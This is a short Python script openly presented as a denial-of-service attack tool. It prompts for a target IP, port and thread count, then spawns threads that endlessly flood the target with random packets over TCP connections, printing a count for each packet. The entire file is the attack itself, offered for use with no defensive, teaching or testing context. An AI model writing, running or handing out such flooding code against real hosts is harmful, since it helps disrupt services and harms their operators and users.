import time
import socket
import sys
import threading
import random

def rand_msg(msg_size):
    msg = ""
    for _ in range(0,msg_size):
        rnd = random.randint(0,255)
        msg += chr(rnd)
    
    return msg

print("DOS [Denial Of Service] attack..........")

url = input("Target ip : ")
port = int(input("Target ip's port : "))
thread_count = int(input("Enter the counts of threads : "))

ip = socket.gethostbyname(url)
print("target ip : ",ip ,"\ntarget port : ",port)
time.sleep(1)

def dos():
    print("dos 시작")
    i = 0
    while True:
        MESSAGE = str.encode(rand_msg(8)) 
        sock.sendto(MESSAGE,(ip,port))
        print("Packet Send! Successfuly => Packet Num : ", i)
        i += 1
        
for _ in range(thread_count):
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.connect((url,port))
        threading.Thread(target=dos).start()
    except KeyboardInterrupt:
        sys.exit(0)